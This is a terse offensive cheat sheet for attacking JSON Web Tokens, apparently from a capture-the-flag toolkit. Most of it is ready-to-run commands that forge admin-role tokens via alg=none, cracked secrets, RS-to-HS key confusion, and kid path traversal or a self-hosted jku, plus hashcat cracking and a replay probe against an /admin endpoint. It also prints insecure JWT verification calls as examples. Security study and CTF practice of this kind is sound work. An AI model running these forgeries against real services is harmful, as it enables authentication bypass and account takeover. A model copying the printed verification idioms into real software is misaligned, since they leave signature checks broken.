# JWT attacks — compact field summary

The short version: `jwt-deep.md` is the full method, `extended-jwt.md` is
the raw payload corpus. This file is the desk card — the technique list
you scan when you have 30 seconds and a token in hand.

---

## 1. The decision in one look

```
token decodes to JSON?        → try alg=none first
alg:RS*/ES*/EdDSA?            → RS→HS confusion IF pubkey reachable
header has kid/jku/x5u?       → header injection (traversal/SSRF/self-host)
secret guessable?             → session_dissect --try-keys
token in URL/cookie readable? → steal not forge
```

## 2. alg=none — 5-second test

```bash
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''
# try variants: --alg none / None / NONE / nOnE
# hand: strip signature, keep trailing dot → aaa.bbb.
```

## 3. Weak secret

```bash
python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist secrets.txt
# or hashcat: hashcat -m 16500 -a 0 "$T" wordlist.txt
# then: jwt_forge --secret <cracked>
```

## 4. RS→HS confusion

```bash
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem
```

Precondition: token signed RS*, public key reachable (`/jwks.json`,
cert, bundle, `openssl s_client`).

## 5. kid / jku / x5u header injection

```bash
python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''
python3 tools/web/jwt_forge.py --token "$T" --kid /proc/sys/kernel/randomize_va_space --kid-secret '2'
python3 tools/web/jwt_forge.py --token "$T" --jku "https://you/jwks.json"
```

## 6. Claim-side bugs (no signature needed)

- `exp` past but accepted → replay
- `aud`/`iss` unchecked → cross-service token
- `sub` coercion `"1"`/`1`/`"01"`/`"1e0"`/`"+1"` → numeric-string to user 1
- `sub`/`name` into SQL → `skills/web-sqli/`
- `jti` unchecked → replay revoked tokens

## 7. The verify-call idioms that burn

```python
jwt.decode(t, key)                                # alg from header
jwt.decode(t, key, algorithms=["HS256","RS256"])  # confusion
jwt.decode(t, options={"verify_signature":False}) # dead
jwt.decode(t, verify=False)                       # dead (pyjwt<2)
```

```javascript
jwt.verify(t, SECRET)                     // alg from header
jwt.decode(t)                             // dead
jwt.verify(t, SECRET, {algorithms:['HS256','RS256']}) // confusion
```

## 8. Replay verification

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/admin" --header "Authorization: Bearer $FORGED" \
  --evidence-regex '"role"\s*:\s*"admin"|flag\{' --evidence-kind impact \
  --on-match confirms --on-miss refutes
```

The forged token accepted on a *protected* endpoint is the only verdict
that counts.
